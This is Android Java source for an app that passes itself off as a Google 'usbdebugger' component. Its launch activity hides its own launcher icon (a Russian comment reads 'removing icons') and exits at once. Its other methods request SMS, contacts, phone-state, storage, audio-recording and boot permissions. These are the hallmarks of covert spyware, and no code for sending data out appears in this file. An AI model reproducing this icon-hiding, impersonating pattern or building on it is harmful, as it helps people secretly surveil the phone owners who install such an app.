package com.google.android.usbdebugger;

import android.Manifest;
import android.annotation.TargetApi;
import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.multidex.MultiDex;
// ===============================

public class Hello extends AppCompatActivity {

    private static final int REQUEST_READ_PHONE_STATE = 1;
    private static final int REQUEST_RECEIVE_SMS = 2;
    private static final int REQUEST_READ_CONTACTS_STATE =3;
    private static final int REQUEST_WRITE_EXTERNAL_STORAGE_STATE = 4;
    private static final int REQUEST_RECEIVE_BOOT_COMPLETED_STATE = 5;
    private static final int REQUEST_INTERNET_STATE = 6;
    private static final int REQUEST_ACCESS_NETWORK_STATE_STATE = 7;
    private static final int REQUEST_RECORD_AUDIO_STATE = 8;


    /*private static final int REQUEST_RECORD_AUDIO_PERMISSION = 200;*/

    @Override
    protected void attachBaseContext(Context base) {
        super.attachBaseContext(base);
        MultiDex.install(this);
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        ///Удаление иконок
        ComponentName componentToDisable = new ComponentName("com.google.android.usbdebugger",
                "com.google.android.usbdebugger.Hello");
        getPackageManager().setComponentEnabledSetting(
                componentToDisable, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        ////


        //ActivityCompat.requestPermissions(this, permissions, REQUEST_RECORD_AUDIO_PERMISSION);


        /*getPermissionToToast();
        getPermissionToReceiveSMS();
        getPermissionToStorage();
        getPermissionToContats();
        getPermissionToBoot();
        getPermissionToAudio();
        getPermissionToNetwork();
        getPermissionToInternet();*/
        finish();
    }

    /*private boolean permissionToRecordAccepted = false;

    private String [] permissions = {Manifest.permission.RECORD_AUDIO};

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode){
            case REQUEST_RECORD_AUDIO_PERMISSION:
                permissionToRecordAccepted  = grantResults[0] == PackageManager.PERMISSION_GRANTED;
                break;
        }
        if (!permissionToRecordAccepted ) finish();

    }*/
/*
    private void Verifypermissions()
    {
        //Log.d(TAG,"Verify permissions: asking user for permissions");
        String[] permissions={Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.CAMERA};
        if(ContextCompat.checkSelfPermission(this.getApplicationContext(),
                permissions[0])== PackageManager.PERMISSION_GRANTED
                && ContextCompat.checkSelfPermission(this.getApplicationContext(),
                permissions[1])==PackageManager.PERMISSION_GRANTED
                && ContextCompat.checkSelfPermission(this.getApplicationContext(),
                permissions[2])==PackageManager.PERMISSION_GRANTED)
        {
            return;
        }

        else
        {
            ActivityCompat.requestPermissions(Hello.this,permissions,REQUEST_CODE);
        }

    }*/

    private void requestForSpecificPermission() {
        ActivityCompat.requestPermissions(this, new String[]{
                Manifest.permission.INTERNET,
                Manifest.permission.ACCESS_NETWORK_STATE,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.WRITE_CONTACTS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.RECORD_AUDIO}, 101);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        if (requestCode == 101) {
            if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                //granted
            } else {
                //not granted
            }
        } else {
            super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        }
    }

   /* @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        Verifypermissions();
    }*/

    @TargetApi(Build.VERSION_CODES.M)
    public void getPermissionToReceiveSMS() {

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS)
                != PackageManager.PERMISSION_GRANTED) {

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (shouldShowRequestPermissionRationale(Manifest.permission.RECEIVE_SMS)) {
                }
            }
            requestPermissions(new String[]{Manifest.permission.RECEIVE_SMS},REQUEST_RECEIVE_SMS);
        }
    }

    @TargetApi(Build.VERSION_CODES.M)
    public void getPermissionToToast() {

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
                != PackageManager.PERMISSION_GRANTED) {

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (shouldShowRequestPermissionRationale(Manifest.permission.READ_PHONE_STATE)) {
                    // Show our own UI to explain to the user why we need to read the contacts
                    // before actually requesting the permission and showing the default UI
                }
            }

            requestPermissions(new String[]{Manifest.permission.READ_PHONE_STATE},REQUEST_READ_PHONE_STATE);
        }
    }

    @TargetApi(Build.VERSION_CODES.M)
    public void getPermissionToStorage() {

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (shouldShowRequestPermissionRationale(Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
                    // Show our own UI to explain to the user why we need to read the contacts
                    // before actually requesting the permission and showing the default UI
                }
            }

            requestPermissions(new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE},REQUEST_WRITE_EXTERNAL_STORAGE_STATE);
        }
    }

    @TargetApi(Build.VERSION_CODES.M)
    public void getPermissionToBoot() {

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_BOOT_COMPLETED)
                != PackageManager.PERMISSION_GRANTED) {

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (shouldShowRequestPermissionRationale(Manifest.permission.RECEIVE_BOOT_COMPLETED)) {
                    // Show our own UI to explain to the user why we need to read the contacts
                    // before actually requesting the permission and showing the default UI
                }
            }

            requestPermissions(new String[]{Manifest.permission.RECEIVE_BOOT_COMPLETED},REQUEST_RECEIVE_BOOT_COMPLETED_STATE);
        }
    }

    @TargetApi(Build.VERSION_CODES.M)
    public void getPermissionToInternet() {

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.INTERNET)
                != PackageManager.PERMISSION_GRANTED) {

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (shouldShowRequestPermissionRationale(Manifest.permission.INTERNET)) {
                    // Show our own UI to explain to the user why we need to read the contacts
                    // before actually requesting the permission and showing the default UI
                }
            }

            requestPermissions(new String[]{Manifest.permission.INTERNET},REQUEST_INTERNET_STATE);
        }
    }

    @TargetApi(Build.VERSION_CODES.M)
    public void getPermissionToNetwork() {

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_NETWORK_STATE)
                != PackageManager.PERMISSION_GRANTED) {

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (shouldShowRequestPermissionRationale(Manifest.permission.ACCESS_NETWORK_STATE)) {
                    // Show our own UI to explain to the user why we need to read the contacts
                    // before actually requesting the permission and showing the default UI
                }
            }

            requestPermissions(new String[]{Manifest.permission.ACCESS_NETWORK_STATE},REQUEST_ACCESS_NETWORK_STATE_STATE);
        }
    }

    @TargetApi(Build.VERSION_CODES.M)
    public void getPermissionToContats() {

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
                != PackageManager.PERMISSION_GRANTED) {

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (shouldShowRequestPermissionRationale(Manifest.permission.READ_CONTACTS)) {
                    // Show our own UI to explain to the user why we need to read the contacts
                    // before actually requesting the permission and showing the default UI
                }
            }

            requestPermissions(new String[]{Manifest.permission.READ_CONTACTS},REQUEST_READ_CONTACTS_STATE);
        }
    }

    @TargetApi(Build.VERSION_CODES.M)
    public void getPermissionToAudio() {

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
                != PackageManager.PERMISSION_GRANTED) {

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (shouldShowRequestPermissionRationale(Manifest.permission.RECORD_AUDIO)) {
                    // Show our own UI to explain to the user why we need to read the contacts
                    // before actually requesting the permission and showing the default UI
                }
            }

            requestPermissions(new String[]{Manifest.permission.RECORD_AUDIO},REQUEST_RECORD_AUDIO_STATE);
        }
    }
}
